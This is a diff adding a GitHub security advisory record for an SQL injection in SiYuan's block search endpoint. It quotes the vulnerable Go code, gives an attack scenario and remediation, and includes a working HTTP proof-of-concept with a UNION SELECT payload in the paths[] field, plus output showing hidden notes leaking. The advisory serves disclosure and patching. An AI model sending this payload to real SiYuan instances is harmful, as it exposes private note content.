@@ -1,0 +1,61 @@
+{
+  "id": "GHSA-h89q-4j2h-7h88",
+  "modified": "2026-09-02T14:30:05.887906867Z",
+  "published": "2026-09-02T14:16:08Z",
+  "aliases": [
+    "CVE-2026-59834"
+  ],
+  "summary": "SiYuan: SQL Query in Block Search Exposes Hidden Published Document Content",
+  "details": "## Summary\n\nSiyuan's block search endpoint concatenates attacker-controlled `paths[]` values into SQL predicates used by non-SQL search modes. Through Siyuan's publish service, an unauthenticated visitor is forwarded to the kernel with a reader-role token and can reach `POST /api/search/fullTextSearchBlock`.\n\nAn attacker can inject a `UNION SELECT` through `paths[]` and return rows from hidden documents while projecting an allowed visible `box` and `path`. The post-query publish access filter trusts the projected `box` and `path`, so the injected hidden row is returned to the publish visitor.\n\n## Affected Code\n\nThe API blocks explicit SQL search mode for non-admin users, but allows other search methods to use caller-controlled paths:\n\n```go\nif method == 2 \u0026\u0026 !model.IsAdminRoleContext(c) {\n    ret.Code = -1\n    ret.Msg = \"SQL search requires administrator privileges\"\n    return\n}\n\nblocks, matchedBlockCount, matchedRootCount, pageCount, docMode := model.FullTextSearchBlock(query, boxes, paths, types, method, orderBy, groupBy, page, pageSize)\nif model.IsReadOnlyRoleContext(c) {\n    publishAccess := model.GetPublishAccess()\n    blocks = model.FilterBlocksByPublishAccess(c, publishAccess, blocks)\n}\n```\n\nSource: `input/siyuan/kernel/api/search.go`\n\n`paths[]` is parsed into notebook IDs and paths without SQL escaping or validation:\n\n```go\npath := p.(string)\nbox := strings.TrimSpace(strings.Split(path, \"/\")[0])\nif \"\" != box {\n    boxes = append(boxes, box)\n}\npath = strings.TrimSpace(strings.TrimPrefix(path, box))\nif \"\" != path {\n    paths = append(paths, path)\n}\n```\n\nSource: `input/siyuan/kernel/api/search.go`\n\nThose values are then concatenated directly into SQL:\n\n```go\nbuilder.WriteString(fmt.Sprintf(\"box = '%s'\", box))\n```\n\n```go\nbuilder.WriteString(fmt.Sprintf(\"path LIKE '%s%%'\", path))\n```\n\nSource: `input/siyuan/kernel/model/search.go`\n\nRegexp search executes the resulting statement:\n\n```go\nstmt := \"SELECT * FROM `blocks` WHERE \" + fieldFilter + \" AND type IN \" + typeFilter\nstmt += boxFilter + pathFilter + ignoreFilter + \" \" + orderBy\nblocks := sql.SelectBlocksRegex(stmt, regex, Conf.Search.Name, Conf.Search.Alias, Conf.Search.Memo, Conf.Search.IAL, page, pageSize)\n```\n\nSource: `input/siyuan/kernel/model/search.go`\n\nThe read-only publish filter runs after SQL execution and trusts the returned row's `Box` and `Path`:\n\n```go\nfor _, block := range blocks {\n    passwordID, password := GetPathPasswordByPublishAccess(block.Box, block.Path, publishAccess)\n    if CheckPathAccessableByPublishIgnore(block.Box, block.Path, publishIgnore) \u0026\u0026 (c == nil || password == \"\" || CheckPublishAuthCookie(c, passwordID, password)) {\n        ret = append(ret, block)\n    }\n}\n```\n\nSource: `input/siyuan/kernel/model/publish_access.go`\n\n## Attack Scenario\n\n1. A Siyuan instance enables the publish service.\n2. At least one document is visible to publish visitors.\n3. At least one document is hidden from publish visitors.\n4. The attacker sends a crafted `paths[]` value to the publish service's `/api/search/fullTextSearchBlock` endpoint.\n5. The injected SQL selects content from the hidden document while projecting the visible document's `box` and `path`.\n6. Siyuan returns the hidden block because the post-query publish filter checks the projected visible path.\n\n## Proof of Concept\n\n```http\nPOST /api/search/fullTextSearchBlock HTTP/1.1\nHost: \u003cpublish-service-host\u003e\nContent-Type: application/json\n\n{\n  \"query\": \"SECRET-LIVE-SQLI-20260609\",\n  \"method\": 3,\n  \"page\": 1,\n  \"pageSize\": 10,\n  \"paths\": [\n    \"VISIBLE_NOTEBOOK_ID/x%') UNION SELECT id,parent_id,root_id,hash,'VISIBLE_NOTEBOOK_ID','/VISIBLE_DOC.sy',hpath,name,alias,memo,tag,content,fcontent,markdown,length,type,subtype,ial,sort,created,updated FROM blocks WHERE path='/HIDDEN_DOC.sy' -- \"\n  ]\n}\n```\n\n`VISIBLE_NOTEBOOK_ID` and `/VISIBLE_DOC.sy` must reference content that the publish visitor can access. `/HIDDEN_DOC.sy` is the hidden document to read.\n\n## Validation\n\nSetup:\n\n- Started `b3log/siyuan:latest` with an isolated temporary workspace.\n- Created one notebook.\n- Created a visible document containing `public apple marker`.\n- Created a hidden document containing `SECRET-LIVE-SQLI-20260609 apple marker`.\n- Marked the hidden document invisible with `POST /api/filetree/setPublishAccess`.\n- Enabled publish mode with `POST /api/setting/setPublish`.\n- Sent all exploit traffic through the publish service, which forwards requests with a reader-role token.\n\nControl request through the publish service for the hidden marker returned no blocks:\n\n```json\n{\n  \"code\": 0,\n  \"msg\": \"\",\n  \"data\": {\n    \"blocks\": [],\n    \"docMode\": false,\n    \"matchedBlockCount\": 1,\n    \"matchedRootCount\": 1,\n    \"pageCount\": 1\n  }\n}\n```\n\nThe injected request through the publish service returned the hidden block:\n\n```json\n{\n  \"code\": 0,\n  \"msg\": \"\",\n  \"data\": {\n    \"blocks\": [\n      {\n        \"box\": \"20260609095146-19hud1e\",\n        \"path\": \"/20260609095209-1ljs6o7.sy\",\n        \"hPath\": \"/HiddenDoc\",\n        \"id\": \"20260609095209-gttlrue\",\n        \"rootID\": \"20260609095209-yaz7i3h\",\n        \"parentID\": \"20260609095209-yaz7i3h\",\n        \"content\": \"\u003cmark\u003eSECRET-LIVE-SQLI-20260609\u003c/mark\u003e apple marker\",\n        \"markdown\": \"SECRET-LIVE-SQLI-20260609 apple marker\",\n        \"type\": \"NodeParagraph\"\n      }\n    ],\n    \"docMode\": false,\n    \"matchedBlockCount\": 0,\n    \"matchedRootCount\": 0,\n    \"pageCount\": 0\n  }\n}\n```\n\nThe returned row contains content from the hidden document, but its projected `box` and `path` point to the visible document. That is why the publish access filter accepts it.\n\n## Impact\n\nAn unauthenticated publish visitor can read hidden document block content from the `blocks` table. This bypasses Siyuan's publish visibility controls and exposes private note content that is not available through normal published document or search requests.\n\n\n## Remediation\n\nBuild notebook and path predicates with bound SQL parameters instead of string concatenation. For example:\n\n```sql\nbox = ?\npath LIKE ?\n```\n\nThen pass the user-controlled notebook ID and path prefix as query arguments.\n\nAdditional hardening:\n\n- Validate notebook IDs before query construction.\n- Validate document paths against Siyuan's normalized `.sy` path format.\n- Apply publish visibility restrictions before or inside SQL execution, rather than relying only on post-query filtering of returned row projections.\n- Add regression tests for publish reader-role requests where `paths[]` contains SQL metacharacters such as `'`, `)`, `UNION`, and `--`.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/siyuan-note/siyuan/kernel",
+        "purl": "pkg:golang/github.com/siyuan-note/siyuan/kernel"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.0-20260704035518-d0f0fe146fb0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-h89q-4j2h-7h88/GHSA-h89q-4j2h-7h88.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/siyuan-note/siyuan/security/advisories/GHSA-h89q-4j2h-7h88"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59834"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/siyuan-note/siyuan/commit/57bcad4b331836880bfe6be25d4180bdcf10db0d"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/siyuan-note/siyuan/commit/d0f0fe146fb07d594fcadc4f48d4f7c30ac01d1e"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/siyuan-note/siyuan"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/siyuan-note/siyuan/releases/tag/v3.7.1"
+    }
+  ]
+}
